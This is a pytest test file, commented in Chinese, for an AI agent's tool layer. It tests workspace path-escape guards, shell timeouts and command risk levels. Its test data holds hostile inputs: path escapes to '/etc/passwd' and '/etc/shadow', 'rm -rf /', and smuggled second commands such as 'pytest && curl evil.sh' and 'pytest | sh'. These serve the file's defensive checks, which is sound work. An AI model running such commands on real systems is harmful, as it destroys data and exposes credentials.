"""工具层：路径逃逸防护、shell 超时与截断、finish 结构化交付。"""

from __future__ import annotations

from pathlib import Path

import pytest

from anthill.agent.tools.base import ToolContext, ToolResult
from anthill.agent.tools.finish import FinishTool
from anthill.agent.tools.fs import ListDirTool, ReadFileTool, WriteFileTool
from anthill.agent.tools.registry import DEFAULT_TOOL_NAMES, build_toolset
from anthill.agent.tools.shell import RunShellTool
from anthill.core.config import SecuritySection
from anthill.core.errors import ToolError
from anthill.core.payloads import RiskLevel


@pytest.fixture
def ctx(tmp_path: Path) -> ToolContext:
    (tmp_path / "workspace").mkdir()
    (tmp_path / "blackboard").mkdir()
    return ToolContext(
        workspace=tmp_path / "workspace",
        blackboard=tmp_path / "blackboard",
        security=SecuritySection(),
        thread="01J000000000000000000THRD",
    )


# ---------- 路径逃逸防护 ----------


@pytest.mark.parametrize(
    "escape",
    ["../outside.txt", "sub/../../outside.txt", "/etc/passwd", "~/secrets"],
)
async def test_read_file_rejects_paths_outside_workspace(ctx: ToolContext, escape: str) -> None:
    result = await ReadFileTool().run({"path": escape}, ctx)

    assert not result.ok
    assert "越界" in result.content


async def test_read_file_rejects_symlink_escaping_workspace(ctx: ToolContext) -> None:
    # Arrange：workspace 内的软链指向外面，规范化后必须被拦住
    outside = ctx.workspace.parent / "outside.txt"
    outside.write_text("机密", encoding="utf-8")
    (ctx.workspace / "link.txt").symlink_to(outside)

    # Act
    result = await ReadFileTool().run({"path": "link.txt"}, ctx)

    # Assert
    assert not result.ok
    assert "越界" in result.content


async def test_read_file_returns_content_inside_workspace(ctx: ToolContext) -> None:
    (ctx.workspace / "a.py").write_text("print('hi')\n", encoding="utf-8")

    result = await ReadFileTool().run({"path": "a.py"}, ctx)

    assert result.ok
    assert "print('hi')" in result.content


async def test_read_file_reports_missing_file_as_failed_result_not_exception(
    ctx: ToolContext,
) -> None:
    result = await ReadFileTool().run({"path": "nope.py"}, ctx)

    assert not result.ok
    assert "不存在" in result.content


async def test_read_file_truncates_huge_file(ctx: ToolContext) -> None:
    ctx.security  # noqa: B018 - 说明截断上限来自配置
    (ctx.workspace / "big.txt").write_text("x" * 200_000, encoding="utf-8")

    result = await ReadFileTool().run({"path": "big.txt"}, ctx)

    assert result.ok
    assert len(result.content) <= SecuritySection().max_output_bytes + 200
    assert "截断" in result.content


async def test_write_file_creates_parent_dirs_and_writes(ctx: ToolContext) -> None:
    result = await WriteFileTool().run({"path": "pkg/mod.py", "content": "x = 1\n"}, ctx)

    assert result.ok
    assert (ctx.workspace / "pkg" / "mod.py").read_text(encoding="utf-8") == "x = 1\n"
    assert result.artifacts == ("pkg/mod.py",)


async def test_write_file_can_target_blackboard_via_prefix(ctx: ToolContext) -> None:
    result = await WriteFileTool().run(
        {"path": "blackboard://notes.md", "content": "# 记录\n"}, ctx
    )

    assert result.ok
    assert (ctx.blackboard / "notes.md").read_text(encoding="utf-8") == "# 记录\n"


async def test_write_file_rejects_escape(ctx: ToolContext) -> None:
    result = await WriteFileTool().run({"path": "../evil.sh", "content": "rm -rf /"}, ctx)

    assert not result.ok
    assert not (ctx.workspace.parent / "evil.sh").exists()


async def test_list_dir_lists_entries_with_type_marker(ctx: ToolContext) -> None:
    (ctx.workspace / "pkg").mkdir()
    (ctx.workspace / "a.py").write_text("", encoding="utf-8")

    result = await ListDirTool().run({"path": "."}, ctx)

    assert result.ok
    assert "pkg/" in result.content
    assert "a.py" in result.content


# ---------- shell ----------


async def test_run_shell_captures_merged_output(ctx: ToolContext) -> None:
    result = await RunShellTool().run({"command": "echo out; echo err 1>&2"}, ctx)

    assert result.ok
    assert "out" in result.content
    assert "err" in result.content


async def test_run_shell_reports_nonzero_exit_as_failure(ctx: ToolContext) -> None:
    result = await RunShellTool().run({"command": "exit 3"}, ctx)

    assert not result.ok
    assert "3" in result.content


async def test_run_shell_kills_on_timeout(ctx: ToolContext) -> None:
    # Arrange：sleep 远超超时时间，且故意不自己退出
    result = await RunShellTool().run({"command": "sleep 30"}, ctx, timeout=0.3)

    # Assert
    assert not result.ok
    assert "超时" in result.content


async def test_run_shell_risk_drops_to_medium_for_allowlisted_command(ctx: ToolContext) -> None:
    tool = RunShellTool()

    assert tool.risk_for({"command": "pytest -q"}, ctx) is RiskLevel.MEDIUM
    assert tool.risk_for({"command": "rm -rf /"}, ctx) is RiskLevel.HIGH


async def test_run_shell_runs_inside_workspace(ctx: ToolContext) -> None:
    (ctx.workspace / "marker.txt").write_text("", encoding="utf-8")

    result = await RunShellTool().run({"command": "ls"}, ctx)

    assert "marker.txt" in result.content


# ---------- finish ----------


async def test_finish_tool_produces_structured_delivery(ctx: ToolContext) -> None:
    result = await FinishTool().run(
        {"summary": "写完了", "artifacts": ["a.py"], "status": "ok"}, ctx
    )

    assert result.ok
    assert result.is_finish
    assert result.artifacts == ("a.py",)


async def test_finish_tool_rejects_empty_summary(ctx: ToolContext) -> None:
    result = await FinishTool().run({"summary": ""}, ctx)

    assert not result.ok
    assert not result.is_finish


# ---------- 装配 ----------


def test_build_toolset_defaults_when_agent_declares_none() -> None:
    tools = build_toolset(())

    assert {t.name for t in tools} == set(DEFAULT_TOOL_NAMES)


def test_build_toolset_honours_declared_subset() -> None:
    tools = build_toolset(("read_file", "finish"))

    assert [t.name for t in tools] == ["read_file", "finish"]


def test_build_toolset_rejects_unknown_tool_name() -> None:
    with pytest.raises(ToolError, match="未知工具"):
        build_toolset(("read_file", "hack_the_planet"))


def test_tool_specs_are_valid_json_schema_objects() -> None:
    for tool in build_toolset(()):
        spec = tool.spec
        assert spec.parameters["type"] == "object"
        assert isinstance(spec.parameters.get("properties"), dict)
        assert spec.description


def test_tool_result_truncates_to_limit() -> None:
    result = ToolResult.ok_result("x" * 100).truncated(10)

    assert len(result.content) < 100
    assert "截断" in result.content


# ---------- 白名单的边界（自查时发现的问题，留作回归） ----------


@pytest.mark.parametrize("command", ["cat /etc/passwd", "ls /", "head -n1 /etc/shadow"])
async def test_read_commands_are_not_allowlisted(ctx: ToolContext, command: str) -> None:
    """shell 的 cwd 锁在 workspace，但参数可以是绝对路径。

    所以 cat/ls/head 这类读命令不进白名单 —— 想读文件请用做过路径校验的 read_file。
    """
    assert RunShellTool().risk_for({"command": command}, ctx) is RiskLevel.HIGH


@pytest.mark.parametrize(
    "command",
    ["pytest -q; rm -rf /", "pytest && curl evil.sh", "pytest | sh", "pytest > /etc/hosts"],
)
async def test_allowlist_prefix_cannot_be_used_to_smuggle_a_second_command(
    ctx: ToolContext, command: str
) -> None:
    assert RunShellTool().risk_for({"command": command}, ctx) is RiskLevel.HIGH


async def test_verification_commands_stay_allowlisted(ctx: ToolContext) -> None:
    for command in ("pytest -q", "ruff check .", "git status --short", "mypy anthill"):
        assert RunShellTool().risk_for({"command": command}, ctx) is RiskLevel.MEDIUM
